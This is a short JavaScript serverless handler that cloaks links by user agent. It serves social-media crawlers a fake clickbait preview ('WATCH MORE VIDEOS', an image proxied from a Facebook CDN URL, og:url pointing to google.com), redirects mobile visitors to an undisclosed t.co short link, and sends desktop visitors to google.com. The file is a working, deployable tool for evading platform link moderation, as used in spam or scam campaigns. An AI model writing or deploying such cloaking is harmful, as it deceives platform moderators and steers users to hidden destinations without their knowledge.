export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="➔WATCH➔MORE➔VIDEOS➔➔">
    <meta property="og:description" content="🤍♥️beautiful♥️🤍">
    <meta property="og:image" content="https://wsrv.nl/?url=https%3A%2F%2Fscontent-fco2-1.xx.fbcdn.net%2Fv%2Ft39.30808-6%2F855201178_122117185461335127_2211327713384949925_n.jpg%3Fstp%3Ddst-jpg_tt6%26cstp%3Dmx720x410%26ctp%3Ds590x590%26_nc_cat%3D107%26ccb%3D1-7%26_nc_sid%3D127cfc%26_nc_eui2%3DAeH0C051ikpHiEcIXnGKVWwgMluQWCZUP1cyW5BYJlQ_V5L7RnyHmNAJNipDYAMFVch2X_JWaO2SkH8da6r-kncx%26_nc_ohc%3Dbx1miJ9pHdkQ7kNvwEOdAN7%26_nc_oc%3DAdqWC93wegAuRa4B7b8_YXJPTOgd2H183MfmzpdSG_LjkZDIv6NbzTQy5_4gr0fyXcU%26_nc_zt%3D23%26_nc_ht%3Dscontent-fco2-1.xx%26_nc_gid%3DAjXDe00Y8OU3AcuK8DqX1g%26_nc_ss%3D782a8%26oh%3D00_AQMbNpAWhMxZEdc0LlZTXW4hm7ebCndVll_-2FVOAwC4tQ%26oe%3D6AD8642C">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://t.co/BLFYAb3UIz", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
